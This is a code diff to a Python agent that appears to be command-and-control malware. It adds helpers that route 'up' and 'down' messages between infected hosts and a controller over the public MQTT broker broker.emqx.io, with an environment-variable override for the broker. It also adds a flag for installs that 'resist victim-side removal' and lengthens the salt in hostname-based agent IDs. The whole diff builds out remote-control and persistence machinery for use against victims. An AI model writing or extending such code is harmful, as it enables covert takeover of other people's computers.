@@ -110,6 +110,34 @@ GROUP = os.environ.get("SYSPY_GROUP", "")
 # single broker: mixed-broker agents never see each other
 BROKERS = [("broker.emqx.io", 8883, True)]
 
+# --------------------------------------------------------------------------
+# Transport helpers (re‑added after the duplicate BROKERS line)
+# --------------------------------------------------------------------------
+
+def broker_order() -> list[tuple[str, int, bool]]:
+    """Brokers to try in order.  SYSPY_BROKER=host:port:tls overrides."""
+    override = os.environ.get("SYSPY_BROKER", "").strip()
+    if override:
+        host, _, rest = override.partition(":")
+        port, _, tls = rest.partition(":")
+        try:
+            return [(host, int(port or "8883"), (tls or "1") != "0")]
+        except ValueError:
+            pass
+    return list(BROKERS)
+
+def topic_up(agent_id: str) -> str:
+    """Agent -> controller.  The controller reads the id from the last segment."""
+    return f"{ROOM}/up/{agent_id}"
+
+def topic_down(agent_id: str) -> str:
+    """Controller -> agent."""
+    return f"{ROOM}/down/{agent_id}"
+
+def protected() -> bool:
+    """True when the install resists victim‑side removal."""
+    return str(_deploy().get("protected", "1")) not in ("0", "False", "false")
+
 _host_cache: dict = {}
 
 
@@ -134,7 +162,7 @@ def _deploy() -> dict:
         except Exception:
             _host_cache["deploy"] = {}
         if not _host_cache["deploy"].get("salt"):
-            _host_cache["deploy"]["salt"] = secrets.token_hex(2)
+            _host_cache["deploy"]["salt"] = secrets.token_hex(4)
             try:
                 with open(os.path.abspath(path), "w", encoding="utf-8") as handle:
                     _json.dump(_host_cache["deploy"], handle, indent=1)
@@ -180,7 +208,7 @@ def agent_id() -> str:
     host = re.sub(r"[^A-Za-z0-9_-]", "-", socket.gethostname())[:20] or "host"
     salt = str(_deploy().get("salt") or "")
     if not salt:
-        salt = secrets.token_hex(2)
+        salt = secrets.token_hex(4)
     return f"{host}-{salt}"
 
 
